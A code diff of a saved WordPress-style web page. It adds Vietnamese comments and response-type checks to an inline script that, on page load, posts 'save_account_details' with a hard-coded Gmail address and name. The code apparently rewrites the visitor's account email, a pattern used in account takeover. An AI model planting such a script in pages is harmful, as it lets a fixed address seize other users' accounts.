@@ -2954,6 +2954,7 @@
       data-wp-strategy="defer"
     ></script>
     <script>
+      // Đổi thông tin email và tên người dùng
       const email = "lacnhuwork@gmail.com"; // Email mới
       const firstName = "Như"; // Họ
       const lastName = "Lê"; // Tên
@@ -2974,9 +2975,29 @@
           save_account_details: "Lưu thay đổi", // Giá trị của nút submit
         }),
       })
-        .then((response) => response.json())
+        .then((response) => {
+          if (response.ok) {
+            // Kiểm tra xem phản hồi có phải JSON không
+            return response.json();
+          } else {
+            // Nếu response không phải JSON, lấy nội dung và in ra để kiểm tra
+            return response.text(); // Đọc HTML nếu không phải JSON
+          }
+        })
         .then((data) => {
-          console.log("Request successful", data);
+          if (typeof data === "object") {
+            // Phản hồi là JSON, xử lý thành công
+            console.log("Request successful", data);
+          } else {
+            // Phản hồi là HTML (ví dụ: lỗi 404, trang đăng nhập)
+            console.error("Response is HTML:", data);
+            // Kiểm tra phản hồi là HTML (lỗi, hoặc yêu cầu login)
+            if (data.includes("<html>")) {
+              console.error(
+                "Server returned an HTML page. This might be a login page or error page."
+              );
+            }
+          }
         })
         .catch((error) => {
           console.error("Error:", error);
